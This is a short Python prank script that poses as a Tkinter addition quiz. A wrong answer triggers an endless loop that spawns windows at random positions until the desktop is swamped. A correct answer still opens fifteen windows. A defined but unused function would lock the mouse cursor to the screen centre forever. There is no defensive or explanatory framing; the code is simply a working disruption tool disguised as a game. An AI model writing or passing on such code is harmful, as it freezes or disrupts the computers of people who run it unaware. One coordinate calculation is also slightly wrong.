import pyautogui, random
class TkGuiApp(object):# class _main
    def __init__(self,errorl=0,l=1,debugmode=False) -> None:# class _main
        import tkinter as tk# import random,sys,tkinter as tk
        from tkinter import simpledialog# from tkinter import simpledialog
        from tkinter import messagebox# from tkinter import messagebox
        import random
        self.random=random
        self.tk=tk
        self.messagebox=messagebox
        self.simpledialog=simpledialog
    def init(self):
        self.root=self.tk.Tk()
        self.root.withdraw()
    def get__(self):
        screen_width = self.root.winfo_screenwidth()# get screen width
        screen_height = self.root.winfo_screenheight()
        return [screen_width,screen_height]
    def inputbox(self,text):
        return self.simpledialog.askstring('quiz', text)# askstring quiz text
    def mbox(self,text):# mbox
        self.messagebox.showinfo('message', text)
    def get_question(self,a,b):
        f=random.randint(a,b)
        s=random.randint(a,b)
        return [f'{str(f)}+{str(s)}',f+s]

app=TkGuiApp()
app.init()
def shubiaozhongjian():
    swh=app.get__()
    while True:
        pyautogui.moveTo(swh[0]/2,swh[1]/2)

def tc(t):
    swh=app.get__()
    for i in range(t):
        a=app.tk.Tk()
        a.title('message')
        a.geometry(f'200x100+{str(random.randint(0,swh[0]))}+{str(random.randint(0,swh[0]))}')
        a.update()
    a.mainloop()

def chaojitanchuang():
    swh=app.get__()
    while True:
        a=app.tk.Tk()
        a.title('message')
        a.geometry(f'200x100+{str(random.randint(0,swh[0]))}+{str(random.randint(0,swh[0]))}')
        a.update()
qu=app.get_question(100,1000)
num=app.inputbox(qu[0])
if num==str(qu[1]):
    app.mbox('对了')
    tc(15)
elif num==None:
    app.mbox('chenggong\nzaijian')
else:
    app.mbox('错了')
    chaojitanchuang()